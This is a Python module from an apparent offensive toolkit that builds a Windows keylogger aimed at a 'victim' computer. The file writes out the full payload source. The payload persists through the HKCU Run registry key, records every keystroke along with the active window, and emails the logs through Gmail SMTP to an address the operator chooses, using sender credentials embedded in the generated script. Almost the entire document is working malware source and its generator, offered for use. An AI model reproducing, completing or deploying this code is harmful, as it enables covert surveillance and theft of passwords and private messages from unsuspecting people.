"""
Key-logger.
"""

import platform
import sys
import smtplib
from inspect import cleandoc
from os import name, remove
from typing import NoReturn

from lamia.exceptions import (
    WrongUserChoiceError,
    NotCompatibleSystemYetError,
    WrongEmailCredentials,
)
from .untils import clear_terminal, decorate_text, pause_script, TextColor, _Path
from .user_information import UserDeviceInformation


class KeyHookModule(UserDeviceInformation):
    """
    This is key-logger created by me from scratch. If this key-logger will be on
    victim pc it will start automatically each time victim turn on computer. After
    collecting data from keyboard, key-hook automatically will sent collected data to
    chosen email.
    """

    def __repr__(self) -> str:
        return f"{self.__class__.__name__}"

    def __init__(self) -> NoReturn:
        super().__init__()
        self._key_hook = _Path()
        self._key_hook.script_path = "key_hook.pyw"
        self._sender_email_name: str = ""
        self._sender_email_password: str = ""
        self._receiver_email_name: str = ""
        self._email_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)

    @decorate_text("KEY-HOOK LOADING ...")
    def check_system_compatibility(self):
        """
        Key hook can be only use in Windows system.
        """
        if name == "nt":
            self.__show_menu()
        elif name != "nt":
            print(NotCompatibleSystemYetError(platform.system()))

    def __show_menu(self) -> NoReturn:
        clear_terminal()
        print(
            cleandoc(
                f"""
            {100 * "-"}
            Using this module you can generate{TextColor.WARNING} KEY-HOOK {TextColor.ENDC}.
            After generating key-hook you can sent him to another computer. When you
            run key-hook on other machine, key-hook will hide in process. When remote
            computer starts up again, key-hook starts up too. Key-hook will sent all
            symbols input from victim keyboard to given address email.
            Do you want to continue? {TextColor.WARNING}Y/N{TextColor.ENDC}
            {100 * "-"}
            """
            )
        )
        menu_choice = input("> ")
        if menu_choice.upper() == "Y":
            self.__generate_key_hook()
        elif menu_choice.upper() != "N":
            print(WrongUserChoiceError())

    def __generate_key_hook(self) -> NoReturn:
        clear_terminal()
        print(
            cleandoc(
                f"""
                {40 * "-"}{TextColor.BLUE} KEY-HOOK GENERATOR {TextColor.ENDC}{40 * "-"}
                Two email addresses are {TextColor.WARNING}required!{TextColor.ENDC}
                """
            )
        )
        with open(self._key_hook.script_path, "w", encoding="utf-8") as file:
            file.write(
                cleandoc(
                    r"""
    # -*- coding: utf-8 -*-
    from ctypes import *
    import pythoncom
    import pynput
    from pynput.keyboard import Key, Listener
    import win32clipboard
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders
    import sys, os
    from os import path
    import socket
    import datetime
    import getpass
    import winreg
    user32 = windll.user32
    kernel32 = windll.kernel32
    psapi = windll.psapi
    current_window = None
    USER_NAME = getpass.getuser()
    keyVal = 'Software\Microsoft\Windows\CurrentVersion\Run'
    def add_to_registry():
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
        except:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
        winreg.SetValueEx(key, "lx", 0, winreg.REG_SZ, rf"C:\Users\{USER_NAME}\Desktop\winup.pyw")
        winreg.CloseKey(key)
    def get_current_process():
        hwnd = user32.GetForegroundWindow()
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = "%d" % pid.value
        executable = create_string_buffer(b"\x00" * 512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
        psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        window_title = create_string_buffer(b"\x00" * 512)
        length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
        print()
        print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
        print()
        # zamknięcie uchwytów
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)
    keys = []
    def on_press(key):
        keys.append(key)
        write_file(keys)
        try:
            pass
        except AttributeError:
            print('')
    def write_file(keys):
        b = os.path.getsize(rf"C:\Users\{USER_NAME}\log.txt")
        key = rf"C:\Users\{USER_NAME}\log.txt"
        ip = socket.gethostbyname(socket.gethostname())
        date = datetime.datetime.now()
        date = date.strftime("%Y-%m-%d %H:%M")
        if b > 100:
            subject = f'IP: {ip}'
            message = f'Time: {date}'
            file_location = key
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = send_to_email
            msg['Subject'] = subject
            msg.attach(MIMEText(message, 'plain'))
            filename = os.path.basename(file_location)
            attachment = open(file_location, "rb")
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(part)
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            text = msg.as_string()
            server.sendmail(email, send_to_email, text)
            server.quit()
        with open(rf'C:\Users\{USER_NAME}\log.txt', 'w') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k == 'Key.space':
                    f.write(' ')
                elif k == 'Key.shift_r' or k == 'Key.shift' or k == 'Key.esc' \
                or k =='Key.backspaceping' or k == 'Key.backspace' or k == 'Key.ctrl_l':
                    pass
                elif k == 'Key.tab' or k == 'Key.enter':
                    f.write('\n')
                else:
                    f.write(k)
    def KeyStroke(event):
        global current_window
        if event.WindowName != current_window:
            current_window = event.WindowName
            get_current_process()"""
                )
                + "\n"
            )
        self.__get_credentials_to_sender_and_receiver_accounts()

    def __get_credentials_to_sender_and_receiver_accounts(self) -> NoReturn:
        self._sender_email_name = input(
            "Write the email name, throughout the script will send data: "
        )
        self._sender_email_password = input("Write password to this email: ")
        self._receiver_email_name = input("Here write email name where script will send data: ")
        self.__check_sender_credentials()
        self.__save_sender_and_receiver_emails_credentials()

    def __check_sender_credentials(self) -> NoReturn:
        if isinstance(self._sender_email_name, str) and isinstance(
            self._sender_email_password, str
        ):
            try:
                self._email_server.login(
                    f"{self._sender_email_name}", f"{self._sender_email_password}"
                )
            except smtplib.SMTPAuthenticationError:
                print(f"{TextColor.ERROR}ERROR!{TextColor.ENDC} Wrong Credentials!")
                remove(self._key_hook.script_path)
                print(WrongEmailCredentials())
                sys.exit(1)
            finally:
                self._email_server.quit()

    def __save_sender_and_receiver_emails_credentials(self) -> NoReturn:
        print(
            cleandoc(
                f"""
            The script will send all symbols from the keyboard on the computer on which
            it will will run to this email address:
            {TextColor.WARNING} {self._receiver_email_name}{TextColor.ENDC}
            """
            )
        )
        pause_script()
        with open(rf"C:\Users\{self._user_hostname}\log.txt", "w", encoding="utf-8") as log, open(
            self._key_hook.script_path, "a", encoding="utf-8"
        ) as generated_key_hook:
            log.write(str("="))
            generated_key_hook.write(
                cleandoc(
                    rf"""
                            email = f'{self._sender_email_name}'
                            password = f'{self._sender_email_password}'
                            send_to_email = f'{self._receiver_email_name}'
                            add_to_registry()
                            listener = Listener(on_press=on_press)
                            listener.start()
                            pythoncom.PumpMessages()
                        """
                )
            )
        self.__show_generated_key_hook_path()

    def __show_generated_key_hook_path(self) -> NoReturn:
        print(
            cleandoc(
                f"""
            Script saved here: {TextColor.WARNING}{self._key_hook.script_path}{TextColor.ENDC}
            """
            )
        )
        pause_script()
